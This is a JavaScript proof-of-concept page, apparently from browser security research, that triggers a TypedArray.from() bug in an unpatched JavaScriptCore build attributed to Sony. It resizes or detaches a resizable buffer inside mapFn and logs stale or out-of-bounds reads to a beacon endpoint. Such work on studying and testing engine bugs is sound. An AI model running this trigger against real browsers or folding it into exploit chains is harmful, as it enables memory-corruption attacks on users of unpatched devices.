// c026: TypedArray.from() array-like path with a resizable source, resized from inside mapFn.
//
// The fix (7a9d1499) adds "@isTypedArrayView(arrayLike) && (@isDetached(arrayLike) || k >= @typedArrayLength(arrayLike))"
// to break out of the loop. Its absence in Sony's tree means the loop keeps its cached arrayLikeLength and keeps
// indexing after mapFn has shrunk the source buffer.
//
// Trigger detail: a typed array normally has @@iterator, which routes from() down the iterator branch. Shadowing
// it with an own undefined forces the array-like branch, which is the vulnerable one, while arrayLike is still a
// typed array view over a resizable buffer.
(function () {
  var LOG = [];
  function note(s) { LOG.push(s); }
  function flush() { for (var i = 0; i < LOG.length; i++) { try { navigator.sendBeacon('/beacon', 'c026-' + LOG[i]); } catch (e) {} } }

  function stats(arr, fromIndex, expect) {
    var bad = 0, firstBad = -1, sample = [];
    for (var i = fromIndex; i < arr.length; i++) {
      if (arr[i] !== expect) { bad++; if (firstBad < 0) firstBad = i; if (sample.length < 6) sample.push(i + ':' + arr[i]); }
    }
    return 'bad=' + bad + ' first=' + firstBad + ' [' + sample.join(' ') + ']';
  }

  note('boot');

  // capability gate
  var rab;
  try { rab = new ArrayBuffer(0x1000, { maxByteLength: 0x1000 }); } catch (e) { note('no-RAB:' + e.name); flush(); return; }
  if (typeof rab.resize !== 'function') { note('no-resize'); flush(); return; }
  note('rab-ok');

  // --- control: same path, no resize. Everything must stay 0x41. ---
  try {
    var c0 = new ArrayBuffer(0x1000, { maxByteLength: 0x1000 });
    var t0 = new Uint8Array(c0);
    t0.fill(0x41);
    t0[Symbol.iterator] = undefined;
    var o0 = Uint8Array.from(t0, function (v, k) { return v; });
    note('CTRL len=' + o0.length + ' ' + stats(o0, 0, 0x41));
  } catch (e) { note('CTRL threw:' + e.name + ':' + e.message); }

  // --- test: shrink the source from inside mapFn on the first call ---
  try {
    var rab2 = new ArrayBuffer(0x1000, { maxByteLength: 0x1000 });
    var t2 = new Uint8Array(rab2);
    t2.fill(0x41);
    t2[Symbol.iterator] = undefined;
    var first = -1;
    var o2 = Uint8Array.from(t2, function (v, k) {
      if (first < 0) { first = k; rab2.resize(0x10); }
      return v;
    });
    note('TEST len=' + o2.length + ' firstCallback=' + first + ' newLen=' + t2.length);
    note('TEST tail ' + stats(o2, 0x10, 0x41));
  } catch (e) { note('TEST threw:' + e.name + ':' + e.message); }

  // --- variant: detach the source instead of shrinking ---
  try {
    var rab3 = new ArrayBuffer(0x1000, { maxByteLength: 0x1000 });
    var t3 = new Uint8Array(rab3);
    t3.fill(0x42);
    t3[Symbol.iterator] = undefined;
    var did = false;
    var o3 = Uint8Array.from(t3, function (v, k) {
      if (!did && rab3.transfer) { did = true; try { rab3.transfer(); } catch (e) {} }
      return v;
    });
    note('DETACH len=' + o3.length + ' transferred=' + did);
    note('DETACH tail ' + stats(o3, 0x10, 0x42));
  } catch (e) { note('DETACH threw:' + e.name + ':' + e.message); }

  note('done');
  flush();
})();
